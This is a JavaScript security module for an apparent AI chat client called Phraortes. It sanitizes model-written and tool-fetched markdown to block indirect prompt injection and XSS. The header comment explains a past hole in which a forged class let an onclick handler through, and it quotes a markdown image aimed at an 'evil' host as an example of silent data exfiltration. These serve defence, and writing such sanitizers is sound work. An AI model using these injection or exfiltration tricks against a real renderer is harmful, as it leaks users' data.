/**
 * ============================================================
 * PHRAORTES SECURITY LAYER — security.js  (v2)
 * ============================================================
 * Everything the model writes — and everything it reads through tools
 * like read_url / web_search — is UNTRUSTED text (indirect prompt
 * injection). renderMD() is the only path from that text to the DOM.
 *
 * WHAT CHANGED IN v2 (and why)
 * ------------------------------
 * v1 re-allowed `onclick` whenever an element carried class="code-tool-btn".
 * But the CLASS is attacker-controlled too, so
 *     <a class="code-tool-btn" onclick="...">
 * in model output survived sanitizing. That was a real XSS hole.
 *
 * v2 removes inline handlers from the sanitizer entirely:
 *   1. marked.parse() -> HTML.
 *   2. Phraortes' own trusted widgets (code cards with Run/Copy/Canvas
 *      buttons, charts, QR cards...) are NOT put in that HTML. The
 *      renderer swaps them for an inert <div data-phr-slot="TOKEN-n">,
 *      where TOKEN is random per render call, so model text can't forge it.
 *   3. DOMPurify sanitizes the HTML with NO onclick allowed anywhere.
 *   4. Only AFTER sanitizing are the slots replaced by the trusted HTML.
 * Untrusted markup never carries a handler; trusted markup never touches
 * the sanitizer. Any SVG that a trusted widget embeds is cleaned
 * separately with PHR_cleanSVG().
 *
 * ALSO HARDENED
 *   - style attributes are filtered to a safe allow-list (no position:fixed
 *     "fake payment screen" overlays), <style> tags are removed
 *   - remote <img> from model text is click-to-load (blocks silent
 *     data-exfiltration via ![](https://evil/?q=...) )
 *   - links open in a new tab with rel=noopener noreferrer
 *   - each text block gets dir="auto" so mixed Persian/English messages
 *     lay out per paragraph
 *
 * LOAD ORDER — after DOMPurify and marked (see <head> in phraortes.html).
 * ============================================================
 */

(function () {
  "use strict";

  var esc = function (s) {
    return String(s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  };
  window.PHR_esc = esc;

  // ---- fail closed if a dependency is missing -----------------------------
  if (typeof DOMPurify === "undefined" || typeof marked === "undefined") {
    console.error("[Phraortes Security] DOMPurify/marked missing — rendering as escaped plain text.");
    window.PHR_trusted = function (h) { return h; };
    window.PHR_cleanSVG = function () { return ""; };
    window.renderMD = function (raw) {
      return '<div style="white-space:pre-wrap">' + esc(raw || "") + "</div>";
    };
    return;
  }

  // ---- style allow-list ---------------------------------------------------
  var SAFE_STYLE = /^(color|background|background-color|fill|fill-opacity|stroke|stroke-width|stroke-linecap|stroke-linejoin|stroke-dasharray|stroke-opacity|stop-color|stop-opacity|opacity|font-family|font-size|font-weight|font-style|text-align|text-anchor|dominant-baseline|direction|text-decoration|letter-spacing|line-height|width|height|max-width|border|border-radius|padding|margin|display)$/;
  function cleanStyle(v) {
    return String(v).split(";").map(function (d) { return d.trim(); }).filter(function (d) {
      if (!d) return false;
      var i = d.indexOf(":");
      if (i < 1) return false;
      var prop = d.slice(0, i).trim().toLowerCase(), val = d.slice(i + 1).toLowerCase();
      if (!SAFE_STYLE.test(prop)) return false;
      if (/url\s*\(|expression|javascript:|@import|var\s*\(/.test(val)) return false;
      return true;
    }).join(";");
  }

  var BLOCK_DIR = /^(P|UL|OL|H[1-6]|BLOCKQUOTE|TD|TH)$/;

  // ---- one hook set, shared by every sanitize() call ------------------------
  DOMPurify.addHook("afterSanitizeAttributes", function (node) {
    if (!node || node.nodeType !== 1) return;
    if (node.hasAttribute && node.hasAttribute("style")) {
      var c = cleanStyle(node.getAttribute("style"));
      if (c) node.setAttribute("style", c); else node.removeAttribute("style");
    }
    if (node.nodeName === "A" && node.hasAttribute("href")) {
      node.setAttribute("target", "_blank");
      node.setAttribute("rel", "noopener noreferrer nofollow");
    }
    if (node.nodeName === "IMG") {
      var src = node.getAttribute("src") || "";
      if (/^https?:\/\//i.test(src)) {
        // Never auto-load a remote image chosen by untrusted text.
        var host = "";
        try { host = new URL(src).hostname; } catch (e) {}
        node.setAttribute("data-phr-src", src);
        node.removeAttribute("src");
        node.removeAttribute("srcset");
        node.setAttribute("class", "phr-img-gate");
        node.setAttribute("alt", "🖼 Tap to load image" + (host ? " — " + host : ""));
      }
    }
    // dir="auto" resolves from the first strong character of the element's OWN text and skips descendants that
    // carry their own dir — so a <p> inside an <li>/<blockquote> must not get one, or the parent falls back to LTR
    // (bullets/quote bars on the wrong side of a Persian paragraph). <li> itself never gets one: its <ul>/<ol> decides.
    if (BLOCK_DIR.test(node.nodeName)) {
      var pn = node.parentNode && node.parentNode.nodeName;
      if (!(node.nodeName === "P" && (pn === "LI" || pn === "BLOCKQUOTE"))) node.setAttribute("dir", "auto");
    }
  });

  var CFG = {
    FORBID_TAGS: ["style", "form", "meta", "link", "base", "iframe", "object", "embed"],
    FORBID_ATTR: ["srcdoc", "formaction", "onclick", "onerror", "onload"],
    ALLOW_DATA_ATTR: true
  };

  // ---- trusted-slot machinery -----------------------------------------------
  var ctx = null;
  function rnd() {
    var a = new Uint32Array(3);
    (window.crypto || window.msCrypto).getRandomValues(a);
    return Array.prototype.map.call(a, function (n) { return n.toString(36); }).join("");
  }

  /** Called by trusted renderers. Returns an inert slot; real HTML is put back after sanitizing. */
  window.PHR_trusted = function (html) {
    if (!ctx) return html;
    ctx.items.push(html);
    return '<div data-phr-slot="' + ctx.token + "-" + (ctx.items.length - 1) + '"></div>';
  };

  /** Clean an SVG string (used by trusted widgets that embed model-written SVG). */
  window.PHR_cleanSVG = function (svg) {
    try {
      return DOMPurify.sanitize(String(svg), {
        USE_PROFILES: { svg: true, svgFilters: true },
        FORBID_TAGS: ["style", "foreignObject"],
        FORBID_ATTR: ["onclick", "onerror", "onload"]
      });
    } catch (e) { return ""; }
  };

  /**
   * The ONLY function phraortes.html may use to turn markdown into HTML.
   * Never call marked.parse() anywhere else.
   */
  window.renderMD = function (raw) {
    var prev = ctx;
    var mine = { token: rnd(), items: [] };
    ctx = mine;
    try {
      var dirty = marked.parse(raw || "");
      var clean = DOMPurify.sanitize(dirty, CFG);
      var re = new RegExp('<div data-phr-slot="' + mine.token + '-(\\d+)"></div>', "g");
      clean = clean.replace(re, function (m, i) { return mine.items[+i] || ""; });
      // horizontal-scroll wrapper for wide tables (sanitized HTML has balanced tags, so plain replacement is safe)
      return clean.replace(/<table\b/g, '<div class="table-scroll"><table').replace(/<\/table>/g, "</table></div>");
    } catch (e) {
      console.error("[Phraortes Security] renderMD failed:", e);
      return "<div style='color:#ff453a;font-size:13px'>⚠ Content could not be rendered safely.</div>";
    } finally {
      ctx = prev;
    }
  };

  // Tap-to-load for gated remote images (event delegation, no inline handlers).
  document.addEventListener("click", function (e) {
    var img = e.target && e.target.closest && e.target.closest("img.phr-img-gate");
    if (!img) return;
    var src = img.getAttribute("data-phr-src");
    if (src && /^https?:\/\//i.test(src)) {
      img.removeAttribute("data-phr-src");
      img.classList.remove("phr-img-gate");
      img.setAttribute("alt", "");
      img.setAttribute("src", src);
    }
  });

  console.log("[Phraortes Security] v2 active — renderMD() is ready.");
})();
